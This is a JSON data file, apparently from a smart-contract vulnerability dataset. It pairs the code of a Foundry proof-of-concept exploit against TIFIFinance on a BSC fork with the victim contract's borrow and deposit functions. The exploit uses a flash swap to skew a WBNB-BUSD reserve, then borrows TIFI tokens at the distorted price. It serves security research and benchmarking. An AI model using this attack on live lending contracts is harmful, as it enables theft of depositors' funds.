[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        TIFI.deposit(address(BUSD), BUSD.balanceOf(address(this)));\n        WBNBToBUSD(); // change the reserve of WBNB - BUSD\n        TIFI.borrow(address(TIFIToken), TIFIToken.balanceOf(address(TIFI))); //call getReserves of WBNB - BUSD LP and borrow TIFI TOKEN\n        TIFIToWBNB();\n        WBNB.transfer(address(Pair), 7 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23_778_726);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        WBNB.approve(address(TIFIRouter), type(uint256).max);\n        BUSD.approve(address(TIFI), type(uint256).max);\n        TIFIToken.approve(address(Router), type(uint256).max);\n        Pair.swap(5 * 1e18, 500 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TIFIFinance",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "  function borrow(ERC20 _token, uint256 _amount)\n    external\n    nonReentrant\n    updatePoolWithInterestsAndTimestamp(_token)\n  {\n    Pool storage pool = pools[address(_token)];\n    require(pool.status == PoolStatus.ACTIVE, \"TIFI: INVALID_POOL_STATE\");\n    require(\n      _amount > 0 && _amount <= getTotalAvailableLiquidity(_token),\n      \"TIFI: INVALID_DEPOSIT_AMOUNT\"\n    );\n\n    // 1. calculate borrow share amount\n    uint256 borrowShare = calculateRoundUpBorrowShareAmount(_token, _amount);\n\n    // 2. update pool state\n    pool.totalBorrows += _amount;\n    pool.totalBorrowShares += borrowShare;\n\n    // 3. update user state\n    UserPoolData storage userData = userPoolData[msg.sender][address(_token)];\n    userData.borrowShares += borrowShare;\n\n    // 4. transfer borrowed token from pool to user\n    _token.safeTransfer(msg.sender, _amount);\n\n    // 5. check account health, this transaction will revert if the account of this user is not healthy\n    require(isAccountHealthy(msg.sender), \"TIFI: ACCOUNT_UNHEALTHY\");\n    emit Borrow(address(_token), msg.sender, borrowShare, _amount);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TIFIFinance",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "  function deposit(ERC20 _token, uint256 _amount)\n    external\n    nonReentrant\n    updatePoolWithInterestsAndTimestamp(_token)\n  {\n    Pool storage pool = pools[address(_token)];\n    require(pool.status == PoolStatus.ACTIVE, \"TIFI: INVALID_POOL_STATE\");\n    require(_amount > 0, \"TIFI: INVALID_DEPOSIT_AMOUNT\");\n\n    // 1. Calculate liquidity share amount\n    uint256 shareAmount = calculateRoundDownLiquidityShareAmount(_token, _amount);\n\n    // 2. Mint TiFiPoolShare token to user equal to liquidity share amount\n    pool.shareToken.mint(msg.sender, shareAmount);\n\n    // 3. transfer user deposit liquidity to the pool\n    _token.safeTransferFrom(msg.sender, address(this), _amount);\n\n    emit Deposit(address(_token), msg.sender, shareAmount, _amount);\n  }\n\n",
    "description": ""
  }
]